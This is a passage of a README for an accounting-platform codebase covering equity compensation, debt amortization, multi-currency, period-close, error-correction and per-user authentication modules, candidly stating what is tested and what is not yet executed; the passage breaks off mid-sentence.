# Debt & Equity Platform — starting codebase

This is a working scaffold, not the finished 7-point platform. It exists to give you
and an engineer a real, tested foundation for the hardest part of the build — the
accounting engine — plus a data model and thin API/UI layer that show how it plugs
together. Read this file before you hand the repo to anyone; it tells you exactly what
to trust and what to build next.

## What's actually real here

Everything under `src/lib/accounting/` is real, working code, executed and verified in
the sandbox this was built in:

- `blackScholes.ts` — option fair value for service/performance-condition awards.
- `vesting.ts` — ASC 718 expense schedules for service, performance, and market
  conditions, plus forfeiture reversal.
- `debtAmortization.ts` — effective-interest amortization for term debt, straight-line
  revolver commitment fees, PIK compounding, a bisection solver for effective yield, a
  daily-basis accrual engine (`buildDailyAccrualDetail`/`buildDailyAccrualSchedule`) for
  floating-rate and other debt where the rate or the outstanding balance can change
  mid-period, a multi-tranche effective-interest engine for delayed-draw term loans
  (`buildMultiTrancheEffectiveInterestSchedule`), a generalized straight-line deferred-
  fee engine for revolving facilities (`buildDeferredFeeSchedule` — original fee plus
  any number of later upsize/amendment fees), and forward-rate-curve / rate-lock
  projection for floating-rate forecasting (`buildProjectedRateSegments`). See each
  section's doc comment for the GAAP distinctions between them — several of these look
  superficially similar but are NOT interchangeable (see "Deferred financing fees" below).
- `convertibleNote.ts` — conventional (non-bifurcated) convertible notes and the
  conversion journal entry.
- `warrantAllocation.ts` — ASC 470-20-25 relative-fair-value allocation between debt
  and detachable warrants, plus a warrant equity/liability classification triage.
- `modificationEngine.ts` — the versioned-terms, replay-based recompute architecture
  from the modification-handling spec. This is the piece that makes "the user enters a
  change to an existing instrument" a routine operation on any instrument type, rather
  than a bespoke rebuild each time.
- `journalEntries.ts` — maps schedule rows to balanced double-entry journal entries.
- `closeService.ts` — the period-close/commit logic: given a full recomputed schedule
  and the date already closed through, works out exactly which periods are new and
  generates their journal entries. Idempotent by construction — see its own doc comment.
- `reporting.ts` — trial-balance-style account summarization and a whole-batch
  reconciliation check (requirement #4: "reporting function that outputs all accounting
  entries and reconciliations"). As of v0.19.0 also a period roll-forward (beginning
  balance / activity / ending balance per account, built on top of the same account
  summarization) and the ASC 718 unrecognized-stock-compensation-cost disclosure — see
  the "Reporting functionality" section below.
- `correctionService.ts` — error correction, as distinct from a modification (see its
  doc comment for why those are different concepts with different code paths). Lets a
  human preview the exact impact of a fix before committing to anything, then elects
  PROSPECTIVE (one adjusting entry in the current open period, closed periods untouched)
  or RETROSPECTIVE (ASC 250 restatement — the closed periods themselves get corrected,
  with the original as-reported rows preserved and flagged superseded, never deleted).
- `fxTranslation.ts` — ASC 830-20 remeasurement of a foreign-currency-denominated
  monetary balance (a EUR term loan, a GBP receivable) into the entity's reporting
  currency, and the resulting transaction gain/loss journal entry. This is the one part
  of multi-currency support that's genuine currency-*conversion* logic, as opposed to
  the currency *tagging* described next.
- `fairValueRemeasurement.ts` — period-over-period fair value roll-forward and gain/loss
  journal entry for anything liability-classified (a bifurcated embedded derivative, a
  liability-classified warrant, a mandatorily redeemable instrument, anything under the
  fair value option) — ASC 815-40 / 480-10-35 / 825-10-25 / 820, with the specific
  citation passed in per instrument since the roll-forward math is identical regardless
  of which one applies. INPUT MODE: manual fair value entry only for now — see that
  file's doc comment for why a market-data auto-feed and a 409A vendor marketplace are
  separate, deferred work, not a gap in this engine.
- `termsValidation.ts` — runtime shape and business-rule validation for every
  instrument type's `terms` JSON payload, used at the API write boundary (see "Input
  validation and auth hardening" below).
- `taxElections.ts` — the tax-election tracking module: the ISO $100,000 limitation
  (IRC 422(d), automatic ISO->NSO reclassification, respecting the statute's grant-
  order rule); the AMT preference on ISO exercise (IRC 56(b)(3)), including the same-
  year-disqualifying-disposition exception; IRC 83(b) elections for restricted stock
  (with the no-election, vest-by-vest alternative computed side by side for comparison);
  QSBS/Section 1202 gain exclusion, covering BOTH the pre- and post-One Big Beautiful
  Bill Act (July 2025) regimes — see that section's doc comment for a specific,
  deliberately flagged caveat about how recent and narrowly-sourced one detail is; and
  debt-side OID (IRC 1272/1273) and market discount (IRC 1276/1278) accrual, including
  both instruments' de minimis exceptions. This is GAAP's sibling file, not an
  extension of it — everything here is an IRC citation, not an ASC one, and nothing in
  it books a journal entry, since a tax election doesn't move an account. Had zero
  callers outside its own tests until v0.19.0, when six API routes under
  `/api/reports/tax/*` (and a form for three of the five sub-modules at `/reports/tax`)
  made it reachable at all — see the "Reporting functionality" section below.
- `exitWaterfall.ts` (v0.19.0) — a liquidation-preference exit waterfall calculator:
  seniority stacking, participating vs. non-participating preferred, participation
  caps. A standalone calculator with ad hoc inputs, not wired to any stored preferred-
  stock terms — see its own doc comment and the "Reporting functionality" section below
  for exactly what that means and doesn't mean.
- `auditTrail.ts` (v0.19.0) — merges `InstrumentTermVersion` and `Correction` rows into
  one chronological "what and when" (and, partially, "who") timeline for compliance
  review. See the "Reporting functionality" section below for the honest limitation on
  user attribution.

**Run `npm test`** (see below) to see all of this execute: 374 tests, each with the
hand-computed or independently cross-checked arithmetic (or, for the input-validation
and auth tests, an exact expected pass/reject/match outcome) in a comment above it, so
you — as the CPA — can grade the test itself, not just trust that it passed.

### Deferred financing fees — which engine to use, and why it matters which one

Three different-looking scenarios all involve "amortizing a fee against debt," and it's
worth being precise about which engine handles which, because using the wrong one
produces a P&L number that can look plausible while the balance sheet treatment behind
it is wrong:

1. **A single-tranche term loan's own issuance discount/fees** — the original
   `buildEffectiveInterestSchedule`. The fee is baked into the gap between `faceValue`
   and `netProceeds` and amortizes via the effective-interest method, netted against
   the liability.
2. **A delayed-draw term loan (DDTL)** — `buildMultiTrancheEffectiveInterestSchedule`.
   Each draw is its own tranche with its own fee, its own net proceeds, and its own
   effective yield, run independently via #1's engine and summed period-by-period. A
   later draw's fee does NOT change the yield already locked in on an earlier draw —
   see the function's doc comment for the full reasoning and its one documented
   limitation (every tranche is assumed to share the facility's overall final maturity).
3. **A revolving facility's deferred financing costs, commitment fees, and any later
   upsize/accordion/amendment fees** — `buildDeferredFeeSchedule` (which generalizes the
   existing `buildRevolverFeeSchedule` commitment-fee function to multiple fee
   tranches). Straight-line, NOT effective-interest — per ASU 2015-15 / ASC 835-30-45-3,
   a revolver has no fixed, known repayment schedule to net a discount against, so its
   fees are capitalized as a deferred charge (asset) and expensed straight-line over the
   commitment period instead. An upsize fee added partway through a facility's life
   amortizes only over what was actually remaining when it was incurred — the function
   takes a list of tranches specifically so a new fee never disturbs a tranche that's
   already partway through amortizing.

Booking #2 or #3's output reuses `journalEntries.ts`'s existing `debtInterestExpenseEntry`
mapper for #2 (same ScheduleRow shape, same discount/premium treatment) — #3 doesn't
have a journal-entry mapper yet since the correct home for the offsetting credit (an
asset account being depleted, not a contra-liability) hasn't been wired up; that's a
short, mechanical follow-up whenever revolver fee amortization needs to actually post.

### Projecting floating-rate resets for forecasting: `buildProjectedRateSegments`

The daily-accrual engine above computes interest from KNOWN, realized rate resets —
correct for booking actual expense, but forecasting (cash-flow projections, covenant
modeling, feeding a fair-value model) needs a rate for resets that haven't happened
yet. `buildProjectedRateSegments` extends a known rate history with projected future
resets under an explicit election: `"lockLatestReset"` (hold the most recent known rate
flat — the simple, conservative default) or `"forwardCurve"` (look up each future reset
against a client-supplied curve, e.g. from SOFR forward pricing, held flat between
curve points the same way `RateSegment` itself works). An optional `spread` handles the
common case where the known history/curve is an index rate rather than the loan's own
all-in rate. The output is just a longer `RateSegment[]` — it feeds straight into
`buildDailyAccrualDetail`/`buildDailyAccrualSchedule` with no changes needed there.
Never use this to book actual interest expense — only ever for forecasting, and label
anything built from it as a projection wherever it's reported, since this function has
no way to do that tagging on its own.

### Daily-basis debt accrual — what it's for and what it isn't

`buildEffectiveInterestSchedule` (the original debt engine) assumes a constant rate and
a balance that only changes at period boundaries — right for fixed-rate term debt
amortizing an OID/premium to a level yield, wrong the moment a rate can reset or a
principal payment can land mid-period on a date that doesn't line up with your
reporting periods (the normal case for floating-rate facilities). The new daily engine
in the same file computes simple interest on the actual balance outstanding each
calendar day, at whichever rate was in effect that day, then rolls that up into whatever
reporting periods you give it — monthly, quarterly, or genuinely irregular, since the
periods no longer need to coincide with rate-reset or payment dates for the numbers to
be right.

Two things worth knowing before using it: (1) it supports both ACT/360 and ACT/365
Fixed day-count conventions, which give different answers for the same nominal rate —
check your credit agreement for which one applies; and (2) it has a documented, but
opinionated, convention for same-day events — a rate reset or principal event dated `D`
takes effect starting on day `D` itself. If your agreement instead excludes the change
date, shift the dates you pass in by one day. `buildDailyAccrualDetail` exposes the
full day-by-day balance/rate/interest detail (not just the period rollup) specifically
so this convention, and every other number, can be hand-verified against your
agreement's actual terms rather than trusted blind.

This gets its own journal-entry mapper, `dailyAccrualInterestEntry` in
journalEntries.ts, rather than reusing `debtInterestExpenseEntry` — the cash-vs-accrual
timing difference here belongs in Accrued Interest Payable, not a discount/premium
contra-liability account, since there's typically no OID to amortize on this kind of
facility. Booking it through the wrong mapper would misstate the balance sheet even
though the P&L interest expense number would happen to come out the same either way.

### Multi-currency — what's actually covered

Two distinct things both go by "multi-currency," and this codebase handles them very
differently:

1. **Currency tagging.** `ScheduleRow` and `JournalEntry` (in `types.ts`) both carry an
   optional `currency` field, defaulted to USD when unset so every existing engine file
   and test keeps working unchanged. `reporting.ts`'s `summarizeByAccount` and
   `checkReconciliation` both group by currency first — an entity with, say, USD term
   loans and EUR-denominated debt gets one `AccountSummary`/`ReconciliationResult` per
   currency, never a single number that silently adds $100 and €100 together as "200."
   This is deliberately NOT full currency-safe arithmetic: nothing stops code from
   calling `.plus()` on a USD amount and a EUR amount and getting a meaningless result —
   see the scope note at the top of `types.ts` for why that further, more invasive
   change is out of scope for now, and isn't needed for what's actually built.
2. **Currency conversion**, which only one thing in this codebase actually needs:
   remeasuring a foreign-currency-denominated monetary balance into the reporting
   currency each period, per ASC 830-20. That's `fxTranslation.ts` — see its module doc
   comment for the full sign-convention walkthrough (worth reading before you trust it:
   the same rate movement is a loss for a liability and a gain for an asset, and the
   module's debit/credit logic leans on that symmetry).

`prisma/schema.prisma` has matching currency columns — `Entity.reportingCurrency`,
`Instrument.currency`, `ScheduleEntry.currency`, `JournalEntry.currency` — all defaulted
to `"USD"` for the same backward-compatibility reason. These are unverified along with
the rest of the schema (see the next section).

### Live preview vs. closed/reported numbers — an important distinction

`GET /api/instruments/:id/schedule` recomputes live on every call — correct for a
preview, wrong for a report, because a period that's already been reported on should
never silently change if the calculation engine's logic improves later. `POST /api/
instruments/:id/close` is the step that freezes a period: it persists ScheduleEntry and
JournalEntry rows for whatever's new since the last close, in one transaction, and does
nothing (rather than re-inserting) if there's nothing new. `GET /api/reports/journal-
entries` reads ONLY from those persisted rows, never from a live recomputation — that's
what makes it a report rather than another preview.

## A correctness bug that was found and fixed while building the data-entry UI (v0.11.0)

This is worth its own section rather than a changelog line, because of how severe it
was and how it slipped past every existing test.

**What was wrong.** Every place that computed "this instrument's schedule as of some
cutoff date" (the live preview, the cap table's current debt balances, the close route,
the correction routes) built its `periods` array the same way: `buildAnnualPeriods
(issueDate, throughDate)`. That looks reasonable, but two of the engines — stock comp
straight-line vesting (`buildServiceConditionSchedule`) and revolver fee amortization
(`buildDeferredFeeSchedule` / `buildRevolverFeeSchedule`) — allocate a *fixed total*
across whatever periods array they're handed, with the rounding remainder dumped
entirely into the *last* period of that array (see `allocateStraightLineByElapsedTime`
in `src/lib/accounting/allocation.ts`). That's the right behavior when the periods
array spans an instrument's entire natural life. It's badly wrong when the array is
truncated at an interim date, because the truncated last period then absorbs the
*entire not-yet-earned remainder*, not just its own slice.

Concretely: a 4-year, $24,000 straight-line option grant, previewed 607 days (1.67
years) into vesting, should show about **$9,971 cumulative recognized**. Every affected
call site instead showed the **full $24,000** — the entire grant, as if it had fully
vested — a roughly 2.4x overstatement. This was caught by hand-verifying the new
instrument-creation form's templates against the live preview end to end, not by any
existing test, because every pre-existing unit test happens to hand these engines the
correct, untruncated periods array directly — the bug only appears when a *caller*
builds a truncated array from an interim cutoff, which no test did until the front end
started doing exactly that.

**The fix**, in `src/lib/accounting/dispatch.ts`:

- `naturalScheduleEndDate(type, terms)` returns the true end of an instrument's
  allocation window (the latest tranche's vest date for STOCK_OPTION/RSU; the latest
  commitment-fee or deferred-fee amortization end for REVOLVER), or `null` for types
  that don't need it (TERM_LOAN, PIK_NOTE, CONVERTIBLE_NOTE, WARRANT — each a
  period-by-period roll-forward, immune to this bug by construction).
- `buildVisiblePeriods(type, termVersions, through, extraSplitBoundaries?)` always
  builds periods out to the natural end first, then splits at `through` (and at any
  extra boundary passed in) so the truncation cutoff becomes an exact period edge
  instead of silently corrupting the last period's math.
- `computeVisibleSchedule(type, termVersions, through, extraSplitBoundaries?)` runs the
  full, correctly-extended schedule and filters the result back down to what's actually
  elapsed as of `through` — this is the function every caller now uses instead of the
  naive `buildAnnualPeriods` + `computeScheduleForInstrument` pattern.

A second, smaller wrinkle surfaced while fixing this: closing (or previewing a
correction for) the same instrument twice inside the same still-open period. The close
workflow decides what's "new" purely by comparing a row's `periodEnd` to the previous
close's cutoff (`determineNewPeriods` in `closeService.ts`) — it has no idea a
recomputed period's *start* might now predate that cutoff. Without care, a second close
later in the same year would re-book everything already committed by the first close,
on top of the new amount. `extraSplitBoundaries` (typically
`[alreadyClosedThroughPeriodEnd]`) fixes this by keeping the previous cutoff pinned as
an exact period edge across every recomputation, so only the true incremental slice
since the last close ever gets produced. See the doc comments above
`naturalScheduleEndDate` and `computeVisibleSchedule` in `dispatch.ts` for the full
mechanism, and `tests/dispatch.test.ts` for the before/after numbers (including the
repeat-close scenario) verified against both hand calculations and the sandbox's real
seeded Postgres data.

**One related, pre-existing, lower-severity issue was found in this pass (v0.11.0) but
deliberately NOT fixed until v0.17.0**: `buildRevolverFeeSchedule` used to divide the
commitment fee equally by period *count*, not day-weighted like the deferred-fee engine
next to it. That was harmless when every period was the same length, which was always
true before the v0.11.0 fix above — but that fix's period-splitting can introduce a
short "elapsed to date" period, which the equal-division convention didn't account for,
causing a smaller (not severity-2.4x) misallocation of the commitment-fee component
specifically. **Fixed in v0.17.0**: `buildRevolverFeeSchedule` now uses the same
day-weighted `allocateStraightLineByElapsedTime` helper the deferred-fee engine already
used, over the fee's own `commitmentStart`/`commitmentEnd` window — see that function's
doc comment in `debtAmortization.ts` for the mechanism and `tests/debtAmortization.test.ts`
/ `tests/dispatch.test.ts` for the before/after numbers. One side effect worth calling
out, not a regression: a facility split into calendar quarters (90/91/92/92 days in a
non-leap year, not exactly equal) no longer shows an identical dollar figure every
quarter — each quarter now gets its own actual-day-count share, which is the more
accurate result, since real unused-commitment fees accrue on actual days outstanding.

**All five call sites that had the bug are now fixed**: `POST /api/instruments/:id/close`,
`GET /api/instruments/:id/schedule`, both correction routes
(`corrections/preview`, `corrections/commit`), the instrument detail page's live
preview, and the cap table's live debt-balance computation.

## Input validation and auth hardening (v0.12.0)

**Input validation.** Every place a client-supplied `terms` JSON payload used to reach
the database unchecked (`POST /api/instruments`, `POST /api/instruments/:id/
modifications`) now validates it first, via `src/lib/accounting/termsValidation.ts` —
closing the gap `dispatch.ts`'s long-standing "NO RUNTIME SHAPE VALIDATION" note flagged.
Each instrument type is checked against the exact shape its engine expects (mirroring
`ServiceConditionGrant`, `TermDebtInputs`, `PikDebtInputs`, `RevolverInputs`,
`ConventionalConvertibleNoteInputs`, and `WarrantInstrumentTerms` field for field), plus
a few cheap-but-high-value business-rule checks on top: a stock/RSU grant's tranche
quantities must sum to its total quantity, a tranche can't vest on or before its own
grant date, and a revolver's fee end dates must be strictly after their start dates.
Every problem in a payload is collected and returned together in one 400 response
(`{ error, issues: [{ path, message }, ...] }`) rather than failing on the first field
and making the caller fix issues one at a time. `POST /api/entities/:id/stakeholders`
also now validates `type` against the real `StakeholderType` enum values before hitting
Postgres, instead of surfacing a raw database constraint error.

This should be a real schema library (Zod — already a `package.json` dependency for
exactly this reason), not hand-rolled checks. It's hand-rolled for the same reason
`decimal.ts` is: this sandbox has no outbound npm registry access, so `zod` could never
actually be installed here. `termsValidation.ts`'s doc comment spells out exactly what
to swap in once you have normal package access — the error shape
(`TermsValidationError.issues`, `{ path, message }`) was deliberately kept close to
Zod's own `ZodError.issues` so the swap is mostly mechanical, not a rewrite.

**Auth hardening.** The single-shared-password Basic Auth stopgap from `src/middleware.ts`
(see the deployment security note above) has two improvements, both in the newly
separated `src/lib/auth/basicAuthCredentials.ts` (pulled out so this logic is
unit-testable without Next.js's Edge runtime, the same reasoning behind
`closeService.ts` being separate from `close/route.ts`):

- **Multiple, individually revocable named credentials.** `APP_ACCESS_PASSWORDS`
  (comma-separated `name:password` pairs) lets each person you share this with have
  their own credential, so revoking one person's access means removing their entry and
  redeploying — not rotating a password everyone else also has to re-enter.
  `APP_ACCESS_PASSWORD` (singular) still works unchanged for a single shared credential;
  the two are additive.
- **Constant-time password comparison**, replacing the original `===` check — which, in
  principle, could let a sufficiently patient network attacker on the public internet
  infer a password one character at a time from response-time differences.
  `timingSafeEqualString` always walks the full length of both strings before returning.

**This remains explicitly not real authentication.** There's still no per-user database
identity, no session/token expiry, no rate limiting on login attempts, and no audit
trail of who accessed what beyond Vercel's own request logs — and every credential
still lives in a Vercel environment variable readable in plaintext by anyone with
project access. Real per-user authentication and multi-tenancy (a `User` model, real
sessions, entity-level access control) is a genuinely separate, larger undertaking,
still tracked as "not addressed" below — this pass hardens the existing stopgap, it
doesn't replace it with a real security model.

**Superseded in v0.13.0.** Everything in this "Auth hardening" subsection —
`basicAuthCredentials.ts`, `APP_ACCESS_PASSWORD`/`APP_ACCESS_PASSWORDS`, and the shared-
credential model itself — was removed and replaced with real per-user authentication.
It's left here as an accurate record of what existed and why, not as current behavior.
See "Real authentication and multi-tenancy (v0.13.0)" immediately below.

## Real authentication and multi-tenancy (v0.13.0)

The single-shared-password Basic Auth stopgap described above is gone. In its place: a
real `User` model, real signed sessions, and per-entity role-based access control — the
"biggest remaining blocker before this could hold real client data," as it was scoped at
the start of this pass.

**Schema.** `User` (email, scrypt password hash) and `EntityAccess` (a join table:
`userId`, `entityId`, `role`) are new in `prisma/schema.prisma` / `db/schema.sql`. The
join-table shape (rather than a `tenantId` column on `Entity`) is deliberate: one user
routinely needs access to more than one entity (an accountant with several clients), and
one entity routinely needs more than one user (two partners, an owner plus a
bookkeeper), so it's a genuine many-to-many, not a one-to-many. `EntityRole` is an
enum with three levels — `OWNER` and `EDITOR` both get full read/write on the entity's
data; only `OWNER` can additionally grant or revoke other users' access to it (`VIEWER`
is read-only). The schema itself encodes an invariant worth calling out: an `Entity`
with zero `EntityAccess` rows is unreachable by anyone through the app, not even its
creator — so every entity-creation code path (`POST /api/entities`) creates the
creator's `OWNER` row in the *same transaction* as the `Entity` itself, never as a
separate step that could fail independently. Verified against a real Postgres 16
instance in `db/validate.sql`: one user with access to multiple entities, one entity
with multiple users, `User.email` uniqueness, `EntityAccess` `UNIQUE(userId, entityId)`,
and RESTRICT-on-delete for a user who still holds grants, all pass.

**Password hashing** (`src/lib/auth/passwordHashing.ts`) uses scrypt (RFC 7914) via
Node's built-in `node:crypto` — not bcrypt/argon2, specifically because `node:crypto`
ships with Node itself and needs no `npm install`, unlike every other real KDF library,
which matters in a sandbox with no npm registry access. Unlike `decimal.ts` or
`termsValidation.ts`, this isn't a stand-in for something better later — scrypt via
`node:crypto` is a genuine, secure choice on its own merits. Stored as
`scrypt:<saltHex>:<hashHex>`; verification uses `timingSafeEqual` on raw bytes, and the
login route runs a verification against a dummy hash even when no user matches the
submitted email, so a wrong-email response and a wrong-password response take the same
amount of time — neither leaks which one was wrong.

**Sessions** (`src/lib/auth/session.ts`) are signed, tamper-evident tokens
(`base64url(payload).base64url(HMAC-SHA256 signature)`), built on Web Crypto
(`crypto.subtle`) rather than `node:crypto` for a specific reason: `crypto.subtle` is a
standard API available in *both* the Edge runtime (where `src/middleware.ts` runs by
default) and the Node.js runtime (API routes), so the exact same module verifies a
session in both places — no risk of the two runtimes' auth logic drifting apart over
time. Sessions carry a 7-day expiry baked into the signed payload; they're signed, not
encrypted, so the payload is base64url-readable but any tampering invalidates the
signature.

**Access control** is split the same way the rest of this codebase splits pure logic
from framework glue (`closeService.ts` vs. `close/route.ts`): `access.ts` (role
ranking, cookie-header parsing — no database, fully unit-tested) vs. `authGuard.ts`
(`getCurrentUser`, `requireEntityAccess` — touches Prisma, so NOT EXECUTED IN THIS
SANDBOX same as everything else that imports `db`). Two thin wrappers,
`src/lib/auth/apiGuard.ts` and `src/lib/auth/pageGuard.ts`, apply the same
authenticate-then-check-role pattern consistently across every entity-scoped API route
and page, respectively, so each call site is one line
(`await requireApiEntityAccess(req, entityId, "EDITOR")` /
`await requirePageEntityAccess(entityId, "VIEWER")`) rather than each route hand-rolling
its own version. Every entity-scoped route and page in the app now goes through one of
these: `GET`/`POST /api/entities`, `/api/entities/:id/stakeholders`,
`/api/instruments` (list/create), `/api/instruments/:id/modifications`, `/close`,
`/schedule`, `/corrections/preview`, `/corrections/commit`, plus the home page, cap
table, instrument detail, reports, and "new instrument" pages. Read actions require at
least `VIEWER`; every action that writes something (creating a stakeholder or
instrument, recording a modification, closing a period, previewing or committing a
correction) requires at least `EDITOR` — correction preview included, even though it
persists nothing, because it exposes the exact restated numbers a commit would book.

**Denial is always a 404, never a 403** — `AccessDeniedError` (in `authGuard.ts`) is
thrown identically whether a user has zero access to an entity or has `VIEWER` access
and attempted an `EDITOR`-only action, and every catching route/page responds with 404
either way (`notFound()` on pages, a plain `{ error }` 404 JSON body on API routes).
Returning 403 for "you can see this exists but can't touch it" would itself leak that
the entity ID is real to someone who has no relationship to it at all — indistinguishable
from a wrong ID is the point.

**`src/middleware.ts` fails closed.** Unlike the old Basic Auth stopgap (a silent no-op
if `APP_ACCESS_PASSWORD` was never set — meaning a misconfigured deployment was a fully
open one), the new middleware returns a 500 on every request if `SESSION_SECRET` is
unset, for both pages and API routes. A real-auth system that's misconfigured should
never silently let everything through; failing loudly and completely is the safer
default. `/login`, `POST /api/auth/login`, and `POST /api/auth/logout` are the only
paths reachable without a valid session.

**Bootstrapping the first user** is a genuine chicken-and-egg problem worth naming
directly: `POST /api/auth/users` (the route that creates new users and grants entity
access) itself requires being logged in as an `OWNER`, so there is no in-app path to
create user #1. `db/seed.sql` now solves this directly — it inserts one bootstrap
`User` (`bootstrap@example.com` / `changeme123!`, a real scrypt hash produced by this
app's own `hashPassword()`, not a placeholder) with `OWNER` access on the sample entity
it seeds. That credential is documented in plaintext deliberately (it's a well-known
seed value, not a secret) and must be treated as compromised by default — see
`DEPLOYMENT.md`'s security note for what to do about it before putting real data behind
a deployment.

**What this doesn't include yet:** no self-service "forgot password" or "change
password" UI (today, rotating a password means calling `hashPassword()` and writing the
result directly via SQL), no rate limiting on login attempts, no audit log of who did
what beyond what Vercel's own request logs capture, and no UI affordance for a `VIEWER`
that hides write controls they'd get a 404 from anyway if they tried to use them (the
API enforces the boundary; the front end doesn't yet tailor itself to the viewer's
role). None of these are as serious a gap as the old stopgap's complete lack of
per-user identity — they're the next layer down, not core to "is this actually
multi-tenant and access-controlled," which it now is.

## The relational schema — now actually executed and validated

The sandbox this was built in has no outbound access to the npm registry (an account-
level network restriction, not a normal constraint you'll hit on your own machine or in
CI), so `prisma` itself has never been installable here and `npx prisma validate` /
`npx prisma migrate dev` could never be run. For a while that meant the entire data
model was unverified past a read-through.

That gap is now narrower. This sandbox turned out to have a real, running PostgreSQL 16
instance available even without npm access, so rather than leave the schema as an
unexecuted document, it was hand-translated into raw SQL and actually run:

- **`db/schema.sql`** — a careful, by-hand translation of every model, enum, relation,
  index, and default in `prisma/schema.prisma` into the DDL Prisma would generate
  (matching table/column names, `NUMERIC(18,4)` for every `Decimal(18,4)`, `JSONB` for
  every `Json` field, native Postgres `ENUM` types, `RESTRICT` on every foreign key —
  see the file's header comment for why `RESTRICT` was a deliberate choice rather than
  an assumption about Prisma's default). This has been executed against a live
  PostgreSQL 16 database in this sandbox and creates the schema cleanly.
- **`db/validate.sql`** — a `BEGIN...ROLLBACK`-wrapped exercise against that live
  database (nothing it does is left behind) that inserts representative data and
  checks the parts of the design that actually matter: a `ServiceConditionGrant`-shaped
  JSONB `terms` payload round-trips and is queryable; `NUMERIC(18,4)` holds a real
  fixed-point figure from the test suite (`5999.9986`) without truncation; the full
  ASC 250 correction audit trail works end to end — a RETROSPECTIVE correction marks
  the original `ScheduleEntry`/`JournalEntry` rows `supersededByCorrectionId` and
  inserts new rows pointing back at the same `Correction`, and a "current view" query
  (`WHERE supersededByCorrectionId IS NULL`) correctly returns exactly one row: the
  restated one, never both; deleting an `Entity` with dependent rows, and deleting a
  `Correction` still referenced by the audit trail, both correctly fail with a foreign-
  key violation instead of silently cascading or silently succeeding; and
  `Entity.reportingCurrency` defaults to `"USD"` when not specified. All five checks
  pass.

**This file is not a replacement for Prisma.** `prisma/schema.prisma` remains the
source of truth — once you have real `npx prisma` access, run `npx prisma migrate dev`
from it as normal and treat Prisma's own generated SQL as canonical. `db/schema.sql`'s
job was narrower and already done: prove the relational design itself is sound (valid
foreign keys, no illegal cycles, sensible cascade behavior, holds up against real
inserts) before more got built on top of it. If you change one of these files, update
the other and re-run `db/validate.sql` to confirm they still agree.

Running this yourself: start a local Postgres, create a database, then
`psql <your-connection-string> -f db/schema.sql` followed by
`psql <your-connection-string> -f db/validate.sql` — watch for `NOTICE: PASS: ...`
lines; any `EXCEPTION` means something regressed.

## What's still NOT executed — narrower than it used to be

With the schema itself now proven against a real database, what's left unexecuted is
specifically the code that depends on `@prisma/client`, which still cannot be installed
here (same npm registry restriction):

- `src/lib/db.ts` — the Prisma client singleton. Written as a standard singleton
  pattern; cannot run until `@prisma/client` is installed and generated.
- `src/app/**` — the Next.js App Router API routes and pages, including the close
  (`/api/instruments/:id/close`), reporting (`/api/reports/journal-entries`), and
  correction (`/api/instruments/:id/corrections/preview` and `/commit`) routes. These
  call the tested engine functions and now a validated schema, but the routes
  themselves still need `npm install` + `npx prisma generate` to actually execute.

The pages themselves are a minimal but real front end, not just the API routes: a home
page listing entities (`src/app/page.tsx`), a cap table per entity with a real fully-
diluted ownership rollup and a separate debt-holder view (`src/app/captable`, backed by
`src/lib/accounting/capTable.ts` — see the "Gaps" section below), an instrument detail
page showing the live-computed schedule side by side with the
persisted/closed rows and journal entries, with buttons to actually close a period and
to run the full preview-then-elect-then-commit correction workflow
(`src/app/instruments/[id]/page.tsx`, `src/app/components/`), and a journal entries
report (`src/app/reports`). Onboarding a new client entity end to end no longer requires
`db/seed.sql` or a direct SQL insert: `src/app/entities/new`, `src/app/stakeholders/new`,
and `src/app/instruments/new` (backed by `src/app/components/NewInstrumentForm.tsx`,
which pre-fills a realistic JSON terms template per instrument type) chain together into
a real "add an entity, add a stakeholder, add an instrument" flow, linked from the home
page and each entity's cap table. As of v0.18.0, the instrument form is a bespoke,
guided per-type form (see the dedicated section below) rather than one JSON textarea
shared by every type; entities and stakeholders also now have real inline edit/delete
controls. `db/seed.sql`
still adds one sample entity with a stock option grant, a term loan, and a PIK note so
there's something to click into on a fresh database without using the forms. See
`DEPLOYMENT.md` for how to actually get this live on a real URL (GitHub + Supabase +
Vercel, no local Node.js required) — that's the part that finally lets you click through
it instead of reading the code.

**A real bug was found and fixed by cross-checking these routes against the schema.**
Both `close/route.ts` and `corrections/commit/route.ts` write `ScheduleEntry` and
`JournalEntry` rows across 4 separate `create()` calls; none of the 4 was setting the
`currency` field, even though the underlying engines (`journalEntries.ts`, the multi-
currency work) already compute and attach the right currency to every row. That meant
a non-USD instrument's persisted rows would have silently gotten the schema's `"USD"`
default regardless of the instrument's actual currency — a real correctness bug, not a
typo, and one that only surfaced by checking the write path against the schema field by
field rather than re-reading the code. Fixed in all 4 call sites: each now writes
`currency: row.currency ?? instrument.currency` (or the `je`/`entry` equivalent),
preferring whatever currency the engine tagged the row with and falling back to the
instrument's own stored currency only when the engine didn't set one.

The correction commit route always recomputes the preview itself server-side before
booking anything — it never trusts a client-supplied number for what actually gets
written, even though the preview route exists for a human to look at first. Worth
testing deliberately against your own database once `@prisma/client` is installed: that
a RETROSPECTIVE election correctly marks the old rows `supersededByCorrectionId` rather
than leaving two live copies of the same period (this is now proven at the SQL level in
`db/validate.sql`; still worth confirming the Prisma-generated queries produce the same
result once they can run).

One design note on the close route specifically: it wraps the schedule-entry and
journal-entry writes in a single `db.$transaction` so a close can't half-succeed
(schedule rows written, journal entries not, or vice versa) — the underlying schema and
constraints are now validated, but the transaction wrapper itself still needs
confirming against a real Prisma client once one can run.

**A word on the sandbox's Postgres setup:** the `app_user` / database used to run
`db/schema.sql` and `db/validate.sql` in this environment are a throwaway, local-only
setup created solely to prove the schema executes and behaves correctly. They are not
meant to be reused as real credentials — point `.env` at your own Supabase/Postgres
instance as described below.

## Front-end polish: bespoke per-type forms, and edit/delete flows (v0.18.0)

**Bespoke instrument forms.** Through v0.17.0, every one of the eleven instrument types
shared a single `<textarea>` where you hand-typed (or pasted from a pre-filled example)
a raw JSON `terms` payload. As of v0.18.0, `NewInstrumentForm.tsx` renders a real,
guided form per type instead — labeled fields, date pickers, dropdowns for the
classification-triage booleans (WARRANT, PREFERRED_STOCK), and row-editable list
controls for tranches/cash flows/fair-value observations/deferred fees, built from a
small shared component library under `src/app/components/termsFields/`:
`FieldPrimitives.tsx` (labeled text/decimal/date/checkbox/select inputs — see its doc
comment for why a "decimal field" is a text input, never `type="number"`, same
floating-point-precision reasoning as `decimal.ts` itself), `ArrayEditors.tsx` (the four
recurring add/remove row-list shapes), and `TypeForms.tsx` (one form per underlying
engine SHAPE, reused across every instrument type that shares it — `ServiceCondition
Grant` backs STOCK_OPTION, RSU, RESTRICTED_STOCK, and a stock-settled SAR's
